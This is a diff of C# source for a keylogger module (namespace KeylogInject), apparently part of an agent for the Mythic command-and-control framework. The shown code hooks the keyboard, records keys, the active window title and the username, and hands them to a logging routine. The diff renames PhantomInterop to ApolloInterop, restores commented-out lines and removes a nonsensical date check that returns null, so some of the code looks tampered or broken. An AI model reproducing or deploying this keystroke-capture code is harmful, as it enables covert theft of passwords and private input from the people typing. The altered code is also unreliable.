@@ -44,11 +44,11 @@ namespace KeylogInject
 
                     if (lParam != IntPtr.Zero)
                     {
-                        
+                        // read virtual key from buffer
                         vKey = Marshal.ReadInt32(lParam);
                         if (msgType == 0x100 || msgType == 0x104)
                         {
-                            
+                            // Parse key
                             if (vKey == 86 && ctrl)
                             {
                                 key = "[PASTE]";
@@ -333,9 +333,9 @@ namespace KeylogInject
                                     case Keys.NumLock:
                                         key = "[Num Lock]";
                                         break;
-                                    
-                                    
-                                    
+                                    //case Keys.Capital:
+                                    //    key = "[Caps Lock]";
+                                    //    break;
                                     case Keys.Space:
                                         key = " ";
                                         break;
@@ -372,12 +372,12 @@ namespace KeylogInject
                                     case Keys.RWin:
                                         key = "[Windows Key]";
                                         break;
-                                    
-                                    
-                                    
-                                    
-                                    
-                                    
+                                    //case Keys.LShiftKey:
+                                    //    key = "[Shift]";
+                                    //    break;
+                                    //case Keys.RShiftKey:
+                                    //    key = "[Shift]";
+                                    //    break;
                                     case Keys.LControlKey:
                                         key = "[Ctrl]";
                                         break;
@@ -394,7 +394,7 @@ namespace KeylogInject
                                 GetWindowText(hWindow, title, title.Capacity);
                         
 
-                            LogMessage(new PhantomInterop.Structs.MythicStructs.KeylogInformation
+                            LogMessage(new ApolloInterop.Structs.MythicStructs.KeylogInformation
                             {
                                 Username = Username,
                                 WindowTitle = title.ToString(),
@@ -406,10 +406,10 @@ namespace KeylogInject
             }
             catch (Exception ex)
             {
-                
-                
+                //Console.WriteLine("[X] Error in CallbackFunction: {0}", ex.Message);
+                //Console.WriteLine("[X] StackTrace: {0}", ex.StackTrace);
             }
-            if(DateTime.Now.Year > 2020) { return CallNextHookEx(HookIdentifier, code, wParam, lParam); } else { return null; }
+            return CallNextHookEx(HookIdentifier, code, wParam, lParam);
         }
     }
 }
